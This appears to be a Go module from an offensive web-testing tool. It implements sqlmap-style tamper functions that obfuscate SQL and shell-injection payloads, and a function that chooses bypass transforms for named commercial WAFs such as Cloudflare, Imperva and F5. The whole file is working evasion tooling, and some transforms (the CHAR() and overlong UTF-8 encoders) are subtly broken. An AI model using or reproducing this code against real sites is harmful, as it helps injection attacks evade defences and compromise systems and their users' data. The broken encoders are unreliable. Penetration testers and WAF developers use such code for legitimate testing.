package payload

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"time"
)

type TamperFunc func(string) string

type TamperScript struct {
	Name        string
	Description string
	Func        TamperFunc
}

var tamperScripts = map[string]TamperScript{
	"space2comment": {
		Name:        "space2comment",
		Description: "Replace spaces with inline comments /**/",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "/**/")
		},
	},
	"space2plus": {
		Name:        "space2plus",
		Description: "Replace spaces with plus signs",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "+")
		},
	},
	"space2tab": {
		Name:        "space2tab",
		Description: "Replace spaces with tabs",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "\t")
		},
	},
	"space2ifs": {
		Name:        "space2ifs",
		Description: "Replace spaces with $IFS (bash)",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "${IFS}")
		},
	},
	"space2newline": {
		Name:        "space2newline",
		Description: "Replace spaces with newlines",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "%0a")
		},
	},
	"space2mcomment": {
		Name:        "space2mcomment",
		Description: "Replace spaces with MySQL comments /*!*/",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "/*!*/")
		},
	},
	"randomcase": {
		Name:        "randomcase",
		Description: "Randomize case of letters",
		Func: func(s string) string {
			rand.Seed(time.Now().UnixNano())
			result := make([]byte, len(s))
			for i, c := range s {
				if c >= 'a' && c <= 'z' {
					if rand.Intn(2) == 0 {
						result[i] = byte(c - 32)
					} else {
						result[i] = byte(c)
					}
				} else if c >= 'A' && c <= 'Z' {
					if rand.Intn(2) == 0 {
						result[i] = byte(c + 32)
					} else {
						result[i] = byte(c)
					}
				} else {
					result[i] = byte(c)
				}
			}
			return string(result)
		},
	},
	"randomcomments": {
		Name:        "randomcomments",
		Description: "Add random inline comments inside keywords",
		Func: func(s string) string {
			keywords := []string{"select", "union", "insert", "update", "delete", "exec", "system", "shell", "eval", "passthru"}
			result := s
			for _, kw := range keywords {
				if strings.Contains(strings.ToLower(result), kw) {
					bypassed := insertRandomComments(kw)
					re := regexp.MustCompile("(?i)" + kw)
					result = re.ReplaceAllStringFunc(result, func(m string) string {
						return bypassed
					})
				}
			}
			return result
		},
	},
	"doubleurlencode": {
		Name:        "doubleurlencode",
		Description: "Double URL encode the payload",
		Func: func(s string) string {
			return doubleURLEncode(s)
		},
	},
	"base64encode": {
		Name:        "base64encode",
		Description: "Base64 encode the payload",
		Func: func(s string) string {
			return base64.StdEncoding.EncodeToString([]byte(s))
		},
	},
	"hexencode": {
		Name:        "hexencode",
		Description: "Hex encode the payload",
		Func: func(s string) string {
			return hex.EncodeToString([]byte(s))
		},
	},
	"unicodeencode": {
		Name:        "unicodeencode",
		Description: "Unicode encode the payload",
		Func: func(s string) string {
			return fullUnicodeEncode(s)
		},
	},
	"charencode": {
		Name:        "charencode",
		Description: "Encode as CHAR() functions",
		Func: func(s string) string {
			var codes []string
			for _, c := range s {
				codes = append(codes, "CHAR("+string(rune(c))+")")
			}
			return "CONCAT(" + strings.Join(codes, ",") + ")"
		},
	},
	"equaltolike": {
		Name:        "equaltolike",
		Description: "Replace = with LIKE",
		Func: func(s string) string {
			return strings.ReplaceAll(s, "=", " LIKE ")
		},
	},
	"modsecurityversioned": {
		Name:        "modsecurityversioned",
		Description: "Bypass ModSecurity with versioned comments",
		Func: func(s string) string {
			return "/*!50000" + s + "*/"
		},
	},
	"modsecurityversionedmore": {
		Name:        "modsecurityversionedmore",
		Description: "Bypass ModSecurity with extended versioned comments",
		Func: func(s string) string {
			return "/*!50000/*!50000" + s + "*/*/"
		},
	},
	"apostrophemask": {
		Name:        "apostrophemask",
		Description: "Replace apostrophes with UTF8 full width",
		Func: func(s string) string {
			return strings.ReplaceAll(s, "'", "\uff07")
		},
	},
	"apostrophenullencode": {
		Name:        "apostrophenullencode",
		Description: "Replace apostrophes with illegal double unicode",
		Func: func(s string) string {
			return strings.ReplaceAll(s, "'", "%00%27")
		},
	},
	"appendnullbyte": {
		Name:        "appendnullbyte",
		Description: "Append null byte to payload",
		Func: func(s string) string {
			return s + "%00"
		},
	},
	"between": {
		Name:        "between",
		Description: "Replace > with NOT BETWEEN 0 AND",
		Func: func(s string) string {
			re := regexp.MustCompile(`(\d+)>(\d+)`)
			return re.ReplaceAllString(s, "$1 NOT BETWEEN 0 AND $2")
		},
	},
	"percentage": {
		Name:        "percentage",
		Description: "Add percentage signs to each character",
		Func: func(s string) string {
			var result strings.Builder
			for _, c := range s {
				if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
					result.WriteString("%" + string(c))
				} else {
					result.WriteRune(c)
				}
			}
			return result.String()
		},
	},
	"chardoubleencode": {
		Name:        "chardoubleencode",
		Description: "Double URL encode each character",
		Func: func(s string) string {
			var result strings.Builder
			for _, c := range s {
				hex := strings.ToUpper(hex.EncodeToString([]byte{byte(c)}))
				result.WriteString("%25" + hex[0:1] + "%25" + hex[1:2])
			}
			return result.String()
		},
	},
	"randomspace": {
		Name:        "randomspace",
		Description: "Add random spaces around keywords",
		Func: func(s string) string {
			keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY"}
			result := s
			for _, kw := range keywords {
				if strings.Contains(strings.ToUpper(result), kw) {
					re := regexp.MustCompile("(?i)" + kw)
					result = re.ReplaceAllStringFunc(result, func(m string) string {
						spaces := strings.Repeat(" ", rand.Intn(3)+1)
						return spaces + m + spaces
					})
				}
			}
			return result
		},
	},
	"sp_password": {
		Name:        "sp_password",
		Description: "Append sp_password for MSSQL obfuscation",
		Func: func(s string) string {
			return s + " -- sp_password"
		},
	},
	"bluecoat": {
		Name:        "bluecoat",
		Description: "Bypass Bluecoat WAF",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "%09")
		},
	},
	"overlongutf8": {
		Name:        "overlongutf8",
		Description: "Use overlong UTF-8 encoding",
		Func: func(s string) string {
			var result strings.Builder
			for _, c := range s {
				if c < 128 {
					result.WriteString(fmt.Sprintf("%%c0%%8%x%x", c>>6, c&0x3f))
				} else {
					result.WriteRune(c)
				}
			}
			return result.String()
		},
	},
	"overlongutf8more": {
		Name:        "overlongutf8more",
		Description: "Extended overlong UTF-8 encoding",
		Func: func(s string) string {
			var result strings.Builder
			for _, c := range s {
				if c < 128 {
					result.WriteString(fmt.Sprintf("%%c0%%af%x", c))
				} else {
					result.WriteRune(c)
				}
			}
			return result.String()
		},
	},
	"slashescape": {
		Name:        "slashescape",
		Description: "Escape with backslashes",
		Func: func(s string) string {
			var result strings.Builder
			for _, c := range s {
				result.WriteString("\\" + string(c))
			}
			return result.String()
		},
	},
	"parentheses": {
		Name:        "parentheses",
		Description: "Wrap in parentheses",
		Func: func(s string) string {
			return "(" + s + ")"
		},
	},
	"equalsspace": {
		Name:        "equalsspace",
		Description: "Add spaces around equals",
		Func: func(s string) string {
			return strings.ReplaceAll(s, "=", " = ")
		},
	},
	"multiplicativetoreplace": {
		Name:        "multiplicativetoreplace",
		Description: "Replace spaces with multiplication",
		Func: func(s string) string {
			return strings.ReplaceAll(s, " ", "*")
		},
	},
	"decrement": {
		Name:        "decrement",
		Description: "Use decrement operators",
		Func: func(s string) string {
			re := regexp.MustCompile(`(\d+)`)
			return re.ReplaceAllStringFunc(s, func(m string) string {
				num := 0
				fmt.Sscanf(m, "%d", &num)
				return fmt.Sprintf("(%d-1)", num+1)
			})
		},
	},
	"increment": {
		Name:        "increment",
		Description: "Use increment operators",
		Func: func(s string) string {
			re := regexp.MustCompile(`(\d+)`)
			return re.ReplaceAllStringFunc(s, func(m string) string {
				num := 0
				fmt.Sscanf(m, "%d", &num)
				return fmt.Sprintf("(%d+1)", num-1)
			})
		},
	},
}

func insertRandomComments(s string) string {
	if len(s) <= 2 {
		return s
	}
	pos := rand.Intn(len(s)-2) + 1
	return s[:pos] + "/**/" + s[pos:]
}

func doubleURLEncode(s string) string {
	var result strings.Builder
	for _, c := range s {
		if c < 128 {
			hex := strings.ToUpper(hex.EncodeToString([]byte{byte(c)}))
			result.WriteString("%25" + hex)
		} else {
			result.WriteRune(c)
		}
	}
	return result.String()
}

func fullUnicodeEncode(s string) string {
	var result strings.Builder
	for _, c := range s {
		result.WriteString(fmt.Sprintf("\\u%04x", c))
	}
	return result.String()
}

type TamperManager struct{}

func NewTamperManager() *TamperManager {
	return &TamperManager{}
}

func (tm *TamperManager) Apply(payload string, scripts []string) string {
	result := payload
	for _, scriptName := range scripts {
		if script, exists := tamperScripts[scriptName]; exists {
			result = script.Func(result)
		}
	}
	return result
}

func (tm *TamperManager) ApplyAll(payload string) []string {
	var results []string
	for _, script := range tamperScripts {
		results = append(results, script.Func(payload))
	}
	return results
}

func (tm *TamperManager) ListScripts() []TamperScript {
	var scripts []TamperScript
	for _, script := range tamperScripts {
		scripts = append(scripts, script)
	}
	return scripts
}

func (tm *TamperManager) GetScript(name string) (TamperScript, bool) {
	script, exists := tamperScripts[name]
	return script, exists
}

func (tm *TamperManager) GetScriptsByCategory() map[string][]TamperScript {
	categories := make(map[string][]TamperScript)
	
	for _, script := range tamperScripts {
		category := getCategory(script.Name)
		categories[category] = append(categories[category], script)
	}
	
	return categories
}

func getCategory(name string) string {
	switch {
	case strings.Contains(name, "space"):
		return "Space Bypass"
	case strings.Contains(name, "encode") || strings.Contains(name, "Encode"):
		return "Encoding"
	case strings.Contains(name, "comment"):
		return "Comment Bypass"
	case strings.Contains(name, "random"):
		return "Randomization"
	case strings.Contains(name, "modsecurity"):
		return "WAF Bypass"
	case strings.Contains(name, "utf") || strings.Contains(name, "unicode"):
		return "Unicode Bypass"
	default:
		return "General"
	}
}

func (tm *TamperManager) GenerateBypassPayloads(payload string, targetWAF string) []string {
	var results []string
	
	wafScripts := getWAFScripts(targetWAF)
	for _, scriptName := range wafScripts {
		if script, exists := tamperScripts[scriptName]; exists {
			results = append(results, script.Func(payload))
		}
	}
	
	results = append(results, tm.ApplyAll(payload)...)
	
	return uniqueStrings(results)
}

func getWAFScripts(waf string) []string {
	wafMap := map[string][]string{
		"modsecurity": {"modsecurityversioned", "modsecurityversionedmore", "space2comment", "randomcase"},
		"cloudflare": {"randomcase", "space2comment", "unicodeencode", "base64encode"},
		"akamai":      {"space2ifs", "randomcomments", "doubleurlencode"},
		"imperva":     {"space2mcomment", "randomcase", "unicodeencode"},
		"f5":          {"space2comment", "randomcomments", "base64encode"},
		"fortinet":    {"space2ifs", "randomcase", "hexencode"},
		"barracuda":   {"space2comment", "randomcomments", "doubleurlencode"},
		"default":     {"space2comment", "randomcase", "unicodeencode", "base64encode"},
	}
	
	if scripts, exists := wafMap[strings.ToLower(waf)]; exists {
		return scripts
	}
	return wafMap["default"]
}

func uniqueStrings(slice []string) []string {
	seen := make(map[string]bool)
	var result []string
	for _, s := range slice {
		if !seen[s] {
			seen[s] = true
			result = append(result, s)
		}
	}
	return result
}
